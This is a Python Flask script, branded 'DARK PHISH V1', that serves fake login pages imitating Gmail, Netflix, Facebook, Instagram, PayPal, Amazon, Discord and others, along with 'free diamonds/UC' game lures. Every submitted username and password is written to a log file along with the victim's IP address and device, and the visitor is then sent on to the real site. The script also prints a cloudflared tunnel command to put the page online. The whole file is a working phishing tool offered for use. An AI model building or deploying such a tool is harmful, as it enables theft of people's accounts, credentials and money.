import os
import threading
from flask import Flask, request, redirect
from datetime import datetime
from pyfiglet import figlet_format

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'

app = Flask(__name__)
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear()
    banner = figlet_format("DARK PHISH V1")
    print(f"{R}{banner}{N}")
    print(f"{C}------------------------------------------------------------")
    print(f"{G}TEAM DARK | ULTRA DANGEROUS PHISHING TOOL | @ᴺᴼ--N̶ᴀ̶ᴍ̶ᴇ̷")
    print(f"{C}------------------------------------------------------------{N}")

def generate_html(title, logo_url, username_placeholder, background_color, button_color, extra_fields=""):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{title}</title>
  <style>
    body {{
      background: {background_color};
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }}
    .container {{
      background: #fff;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(0,0,0,0.3);
      text-align: center;
      width: 90%;
      max-width: 450px;
      animation: fadeIn 1s ease-in-out;
    }}
    @keyframes fadeIn {{
      0% {{ opacity: 0; transform: translateY(-20px); }}
      100% {{ opacity: 1; transform: translateY(0); }}
    }}
    .container img {{
      width: 80px;
      margin-bottom: 20px;
      transition: transform 0.3s;
    }}
    .container img:hover {{
      transform: scale(1.1);
    }}
    input {{
      width: 90%;
      padding: 15px;
      margin: 12px 0;
      border-radius: 10px;
      border: 1px solid #ddd;
      font-size: 16px;
      transition: border-color 0.3s;
    }}
    input:focus {{
      border-color: {button_color};
      outline: none;
    }}
    button {{
      width: 95%;
      padding: 15px;
      background: {button_color};
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s, transform 0.1s;
    }}
    button:hover {{
      background: #444;
      transform: scale(1.02);
    }}
    button:active {{
      transform: scale(0.98);
    }}
    .secure-text {{
      font-size: 12px;
      color: #888;
      margin-top: 15px;
      animation: fadeText 2s infinite;
    }}
    @keyframes fadeText {{
      0% {{ opacity: 0.5; }}
      50% {{ opacity: 1; }}
      100% {{ opacity: 0.5; }}
    }}
  </style>
</head>
<body>
  <div class="container">
    <img src="{logo_url}" alt="Logo">
    <h2>{title}</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="{username_placeholder}" required>
      <input type="password" name="password" placeholder="Password" required>
      {extra_fields}
      <button type="submit">Login</button>
    </form>
    <div class="secure-text">🔒 Secure Connection | End-to-End Encrypted</div>
  </div>
</body>
</html>"""

platforms = {
    "Gmail": {
        "redirect": "https://mail.google.com",
        "placeholder": "Email or Phone",
        "html": generate_html("Gmail Login", "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico", "Email or Phone", "#f8f9fa", "#4285f4")
    },
    "Free Fire - Diamonds": {
        "redirect": "https://freefiremobile.com",
        "placeholder": "Free Fire ID",
        "html": generate_html("Free Fire Diamonds", "https://cdn-icons-png.flaticon.com/512/831/831276.png", "Player ID", "#ff4500", "#ff6347", '<input type="number" name="extra" placeholder="Diamond Amount" required>')
    },
    "BGMI - Free UC": {
        "redirect": "https://www.battlegroundsmobileindia.com",
        "placeholder": "BGMI ID",
        "html": generate_html("BGMI UC Generator", "https://cdn-icons-png.flaticon.com/512/732/732228.png", "BGMI ID", "#1c2526", "#ffca28", '<input type="number" name="extra" placeholder="UC Amount" required>')
    },
    "Netflix": {
        "redirect": "https://www.netflix.com",
        "placeholder": "Email or Phone",
        "html": generate_html("Netflix Login", "https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png", "Email or Phone", "#141414", "#e50914")
    },
    "Twitter": {
        "redirect": "https://twitter.com",
        "placeholder": "Username or Email",
        "html": generate_html("Twitter Login", "https://cdn-icons-png.flaticon.com/512/733/733579.png", "Username or Email", "#f5f8fa", "#1da1f2")
    },
    "Facebook": {
        "redirect": "https://facebook.com",
        "placeholder": "Email or Mobile",
        "html": generate_html("Facebook Login", "https://cdn-icons-png.flaticon.com/512/124/124010.png", "Email or Mobile", "#f0f2f5", "#1877f2")
    },
    "Instagram": {
        "redirect": "https://instagram.com",
        "placeholder": "Username",
        "html": generate_html("Instagram Login", "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png", "Username", "#fafafa", "#e1306c")
    },
    "Discord": {
        "redirect": "https://discord.com",
        "placeholder": "Email or Username",
        "html": generate_html("Discord Login", "https://cdn.worldvectorlogo.com/logos/discord-6.svg", "Email or Username", "#2c2f33", "#5865f2")
    },
    "Snapchat": {
        "redirect": "https://snapchat.com",
        "placeholder": "Username",
        "html": generate_html("Snapchat Login", "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "Username", "#fffc00", "#000000")
    },
    "Pinterest": {
        "redirect": "https://pinterest.com",
        "placeholder": "Email or Username",
        "html": generate_html("Pinterest Login", "https://cdn-icons-png.flaticon.com/512/733/733646.png", "Email or Username", "#f5f5f5", "#e60023")
    },
    "Amazon": {
        "redirect": "https://amazon.com",
        "placeholder": "Email or Mobile",
        "html": generate_html("Amazon Login", "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg", "Email or Mobile", "#f5f5f5", "#ff9900")
    },
    "PayPal": {
        "redirect": "https://paypal.com",
        "placeholder": "Email or Phone",
        "html": generate_html("PayPal Login", "https://www.paypalobjects.com/webstatic/icon/pp258.png", "Email or Phone", "#f5f5f5", "#009cde")
    },
}

def run_phishing(platform_data, port, platform_name):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    victim_file = f"dark_phish_{platform_name.replace(' ', '_')}_{timestamp}.log"

    @app.route("/", methods=["GET", "POST"])
    def login():
        if request.method == "POST":
            username = request.form.get("username", "N/A")
            password = request.form.get("password", "N/A")
            extra = request.form.get("extra", "")
            ip_address = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')

            log = f"[{datetime.now()}] {platform_name} | Username: {username} | Password: {password}"
            if extra:
                log += f" | Extra: {extra}"
            log += f" | IP: {ip_address} | Device: {user_agent}\n"

            print(f"{G}[+] {log.strip()}{N}")

            with open(victim_file, "a", encoding="utf-8") as f:
                f.write(log)

            return redirect(platform_data["redirect"])
        return platform_data["html"]

    app.run(host="0.0.0.0", port=port)

def main():
    show_banner()

    print(f"{Y}Select a platform:{N}")
    keys = list(platforms.keys())
    for i, name in enumerate(keys, 1):
        print(f"{C}[{i}] {name}{N}")

    try:
        choice = int(input(f"\n{Y}Choice: {N}"))
        platform_name = keys[choice - 1]
        platform_data = platforms[platform_name]
    except (ValueError, IndexError):
        print(f"{R}Invalid choice. Exiting...{N}")
        return

    port = input(f"{C}Enter port (default 5000): {N}").strip()
    if not port:
        port = "5000"

    clear()
    print(f"\n{G}Launching phishing page for: {platform_name}{N}")
    print(f"{B}Port: {port}{N}")

    threading.Thread(target=run_phishing, args=(platform_data, int(port), platform_name)).start()

    print(f"\n{Y}Run in new session:{N}")
    print(f"{G}cloudflared tunnel --url http://localhost:{port}{N}")
    print(f"\n{Y}Waiting for credentials... CTRL+C to stop.{N}")

if __name__ == "__main__":
    main()